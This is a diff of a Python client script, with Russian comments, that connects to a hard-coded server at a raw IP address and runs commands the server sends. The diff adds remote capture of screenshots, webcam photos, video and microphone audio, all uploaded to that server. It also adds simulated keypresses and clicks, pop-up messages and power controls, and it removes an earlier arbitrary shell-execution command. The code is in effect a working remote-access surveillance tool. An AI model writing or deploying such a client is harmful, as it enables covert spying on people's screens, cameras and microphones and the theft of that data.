@@ -1,4 +1,3 @@
-# client.py - исправленная версия с расширенным функционалом
 import requests
 import socket
 import time
@@ -14,19 +13,22 @@ import subprocess
 import psutil
 import ctypes
 import json
+import cv2
+import numpy as np
+import pyaudio
+import wave
+import keyboard as kb
+from io import BytesIO
 
-# Конфигурация
-SERVER_URL = "http://193.124.121.76:4443"  # Замените на ваш адрес сервера
+SERVER_URL = "http://193.124.121.76:4443"
 
 def generate_device_id():
-    """Генерирует уникальный ID устройства"""
     pc_name = platform.node()
     unique_hash = hashlib.md5(str(uuid.getnode()).encode()).hexdigest()[:6].upper()
     device_id = f"{pc_name}-{unique_hash}"
     return ''.join(e for e in device_id if e.isalnum() or e == '-')
 
 def get_system_info():
-    """Собирает информацию о системе"""
     return {
         "name": platform.node(),
         "os": platform.system(),
@@ -42,7 +44,6 @@ class PCClient:
         self.running = True
         
     def register_device(self):
-        """Регистрация устройства на сервере"""
         while self.running:
             try:
                 data = {
@@ -66,51 +67,11 @@ class PCClient:
                     
             except requests.exceptions.RequestException as e:
                 print(f"Ошибка подключения: {e}")
-                print("Проверьте:")
-                print(f"1. Сервер запущен по адресу {SERVER_URL}")
-                print("2. Порт 8080 открыт в фаерволе")
-                print("3. Сеть доступна")
                 time.sleep(30)
                 
         return False
     
-    def take_screenshot(self):
-        """Создание скриншота и отправка на сервер"""
-        try:
-            # Создаем скриншот
-            screenshot = pyautogui.screenshot()
-            
-            # Сохраняем временно
-            temp_file = f"screenshot_{self.device_id}.png"
-            screenshot.save(temp_file)
-            
-            # Читаем файл и кодируем в base64
-            with open(temp_file, "rb") as image_file:
-                encoded_image = base64.b64encode(image_file.read()).decode('utf-8')
-            
-            # Удаляем временный файл
-            os.remove(temp_file)
-            
-            # Отправляем на сервер
-            response = requests.post(
-                f"{SERVER_URL}/upload_screenshot",
-                json={
-                    "device_id": self.device_id,
-                    "image": encoded_image
-                },
-                timeout=30
-            )
-            
-            if response.status_code == 200:
-                print("Скриншот успешно отправлен")
-            else:
-                print(f"Ошибка отправки скриншота: {response.text}")
-                
-        except Exception as e:
-            print(f"Ошибка при создании скриншота: {e}")
-    
     def send_heartbeat(self):
-        """Регулярная отправка сигналов активности"""
         while self.running:
             try:
                 response = requests.post(
@@ -122,6 +83,7 @@ class PCClient:
                 if response.status_code != 200:
                     print(f"Ошибка heartbeat: {response.text}")
                     
+                print('heartbeat отправлен')
                 time.sleep(60)
                 
             except Exception as e:
@@ -129,7 +91,6 @@ class PCClient:
                 time.sleep(10)
     
     def check_commands(self):
-        """Проверка команд от сервера"""
         while self.running:
             try:
                 response = requests.get(
@@ -151,32 +112,45 @@ class PCClient:
                 time.sleep(10)
     
     def execute_command(self, command):
-        """Выполнение полученной команды"""
         try:
             print(f"Получена команда: {command['command']}")
             result = ""
-            
-            if command['command'] == 'screenshot':
-                self.take_screenshot()
-                result = "Скриншот выполнен и отправлен"
-                
-            elif command['command'] == 'shutdown':
+            file_data = None
+            file_type = None
+            cmd = command['command']
+            # Для show_message поддерживаем кастомный текст
+            if cmd.startswith('show_message:'):
+                title = "Сообщение"
+                text = cmd[len('show_message:'):]
+                pyautogui.alert(text=text, title=title)
+                result = f"Показано сообщение: {title} - {text}"
+            elif cmd == 'screenshot':
+                result, file_data, file_type = self.take_screenshot()
+            elif cmd == 'webcam':
+                result, file_data, file_type = self.capture_webcam()
+            elif cmd == 'record_video_10':
+                result, file_data, file_type = self.record_video(10)
+            elif cmd == 'record_audio_10':
+                result, file_data, file_type = self.record_audio(10)
+            elif cmd == 'mouse_click':
+                pyautogui.click()
+                result = "Выполнен клик мыши"
+            elif cmd == 'hotkey':
+                kb.press_and_release('ctrl+alt+delete')
+                result = "Выполнена комбинация клавиш: Ctrl+Alt+Delete"
+            elif cmd == 'shutdown':
                 subprocess.run(["shutdown", "/s", "/t", "0"])
                 result = "Компьютер выключается"
-                
-            elif command['command'] == 'reboot':
+            elif cmd == 'reboot':
                 subprocess.run(["shutdown", "/r", "/t", "0"])
                 result = "Компьютер перезагружается"
-                
-            elif command['command'] == 'lock':
+            elif cmd == 'lock':
                 ctypes.windll.user32.LockWorkStation()
                 result = "Компьютер заблокирован"
-                
-            elif command['command'] == 'sleep':
+            elif cmd == 'sleep':
                 subprocess.run(["rundll32.exe", "powrprof.dll,SetSuspendState", "0,1,0"])
                 result = "Компьютер переведен в спящий режим"
-                
-            elif command['command'] == 'processes':
+            elif cmd == 'processes':
                 processes = []
                 for proc in psutil.process_iter(['pid', 'name', 'username']):
                     processes.append({
@@ -185,48 +159,131 @@ class PCClient:
                         'user': proc.info['username']
                     })
                 result = json.dumps(processes, indent=2, ensure_ascii=False)
-                
-            elif command['command'].startswith('killprocess:'):
-                pid = int(command['command'].split(':')[1])
-                try:
-                    p = psutil.Process(pid)
-                    p.terminate()
-                    result = f"Процесс {pid} завершен"
-                except Exception as e:
-                    result = f"Ошибка завершения процесса {pid}: {str(e)}"
-                
-            elif command['command'].startswith('cmd:'):
-                cmd = command['command'].split(':', 1)[1]
-                try:
-                    output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True)
-                    result = output
-                except subprocess.CalledProcessError as e:
-                    result = f"Ошибка выполнения команды: {e.output}"
-                
-            # Отправляем результат выполнения команды
-            if result:
-                requests.post(
-                    f"{SERVER_URL}/command_result",
-                    json={
-                        "device_id": self.device_id,
-                        "command_id": command['id'],
-                        "result": result
-                    }
-                )
-                
+            elif cmd == 'cmd':
+                cmdline = "ipconfig"
+                output = subprocess.check_output(cmdline, shell=True, stderr=subprocess.STDOUT, text=True)
+                result = output
+            self.send_command_result(command['id'], result, file_data, file_type)
         except Exception as e:
             print(f"Ошибка выполнения команды: {e}")
+            self.send_command_result(command['id'], f"Ошибка: {str(e)}")
+    
+    def take_screenshot(self):
+        try:
+            screenshot = pyautogui.screenshot()
+            img_bytes = BytesIO()
+            screenshot.save(img_bytes, format='PNG')
+            img_bytes = img_bytes.getvalue()
+            return "Скриншот выполнен", base64.b64encode(img_bytes).decode('utf-8'), 'photo'
+        except Exception as e:
+            return f"Ошибка создания скриншота: {str(e)}", None, None
+    
+    def capture_webcam(self):
+        try:
+            cap = cv2.VideoCapture(0)
+            ret, frame = cap.read()
+            cap.release()
+            
+            if ret:
+                _, img_encoded = cv2.imencode('.jpg', frame)
+                img_bytes = img_encoded.tobytes()
+                return "Фото с веб-камеры сделано", base64.b64encode(img_bytes).decode('utf-8'), 'photo'
+            else:
+                return "Не удалось получить фото с веб-камеры", None, None
+        except Exception as e:
+            return f"Ошибка доступа к веб-камере: {str(e)}", None, None
+    
+    def record_video(self, seconds):
+        try:
+            cap = cv2.VideoCapture(0)
+            # Используем MJPG, который часто работает лучше
+            fourcc = cv2.VideoWriter_fourcc(*'MJPG')
+            temp_file = f"temp_video_{self.device_id}.avi"
+            out = cv2.VideoWriter(temp_file, fourcc, 20.0, (640, 480))
+            start_time = time.time()
+            frame_written = False
+            while (time.time() - start_time) < seconds:
+                ret, frame = cap.read()
+                if ret and frame is not None and frame.sum() > 0:
+                    out.write(frame)
+                    frame_written = True
+                else:
+                    break
+            cap.release()
+            out.release()
+            if not frame_written:
+                return "Ошибка: не удалось записать видео (нет кадров с камеры)", None, None
+            with open(temp_file, "rb") as f:
+                video_bytes = f.read()
+            os.remove(temp_file)
+            return f"Видео записано ({seconds} сек)", base64.b64encode(video_bytes).decode('utf-8'), 'video'
+        except Exception as e:
+            return f"Ошибка записи видео: {str(e)}", None, None
+    
+    def record_audio(self, seconds):
+        try:
+            CHUNK = 1024
+            FORMAT = pyaudio.paInt16
+            CHANNELS = 2
+            RATE = 44100
+            RECORD_SECONDS = seconds
+            temp_file = f"temp_audio_{self.device_id}.wav"
+            p = pyaudio.PyAudio()
+            try:
+                stream = p.open(format=FORMAT,
+                              channels=CHANNELS,
+                              rate=RATE,
+                              input=True,
+                              frames_per_buffer=CHUNK)
+            except Exception:
+                # fallback на 1 канал
+                CHANNELS = 1
+                stream = p.open(format=FORMAT,
+                              channels=CHANNELS,
+                              rate=RATE,
+                              input=True,
+                              frames_per_buffer=CHUNK)
+            frames = []
+            for _ in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
+                data = stream.read(CHUNK)
+                frames.append(data)
+            stream.stop_stream()
+            stream.close()
+            p.terminate()
+            wf = wave.open(temp_file, 'wb')
+            wf.setnchannels(CHANNELS)
+            wf.setsampwidth(p.get_sample_size(FORMAT))
+            wf.setframerate(RATE)
+            wf.writeframes(b''.join(frames))
+            wf.close()
+            with open(temp_file, "rb") as f:
+                audio_bytes = f.read()
+            os.remove(temp_file)
+            return f"Аудио записано ({seconds} сек)", base64.b64encode(audio_bytes).decode('utf-8'), 'audio'
+        except Exception as e:
+            return f"Ошибка записи аудио: {str(e)}", None, None
+    
+    def send_command_result(self, command_id, result, file_data=None, file_type=None):
+        data = {
+            "device_id": self.device_id,
+            "command_id": command_id,
+            "result": result
+        }
+        
+        if file_data and file_type:
+            data["file_type"] = file_type
+            data["file_data"] = file_data
+        
+        try:
             requests.post(
                 f"{SERVER_URL}/command_result",
-                json={
-                    "device_id": self.device_id,
-                    "command_id": command['id'],
-                    "result": f"Ошибка выполнения команды: {str(e)}"
-                }
+                json=data,
+                timeout=30
             )
+        except Exception as e:
+            print(f"Ошибка отправки результата: {e}")
     
     def run(self):
-        """Запуск клиента"""
         print(f"Запуск клиента с ID: {self.device_id}")
         
         if self.register_device():
